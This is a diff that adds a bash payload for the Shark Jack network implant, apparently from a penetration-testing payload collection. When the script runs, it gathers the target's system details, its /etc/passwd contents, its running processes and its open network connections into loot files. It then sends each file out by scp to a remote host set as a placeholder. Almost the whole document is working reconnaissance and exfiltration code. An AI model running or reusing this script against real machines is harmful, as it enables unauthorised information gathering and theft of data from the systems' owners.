@@ -1,0 +1,39 @@
+#!/bin/bash
+
+# 
+# Title: Shark Bite - Target Information Exfiltration Payload via SSH
+# Author: 810810810
+# Version: 1.1
+# 
+# Description: This payload uses the power of the Shark Jack to gather information about 
+# the target and exfiltrate it to a remote server using the scp command over SSH.
+
+LOOT_DIR=/root/loot/shark_attack 
+REMOTE_USER=username
+REMOTE_HOST=your-computer.com
+REMOTE_DIR=/path/to/remote/directory
+
+LED SETUP 
+
+# Gather system information
+uname -a > $LOOT_DIR/system_info.txt
+cat /etc/os-release >> $LOOT_DIR/system_info.txt
+
+# Gather user information
+id > $LOOT_DIR/user_info.txt
+cat /etc/passwd >> $LOOT_DIR/user_info.txt
+
+# Gather process information
+ps aux > $LOOT_DIR/process_info.txt
+
+# Gather network connection information
+netstat -anp > $LOOT_DIR/netstat_info.txt
+ss -tup > $LOOT_DIR/ss_info.txt
+
+LED ATTACK 
+
+# Exfiltrate all information files
+FILES="$LOOT_DIR/*.txt" 
+for f in $FILES; do scp $f $REMOTE_USER@$REMOTE_HOST:$REMOTE_DIR; done 
+
+LED FINISH
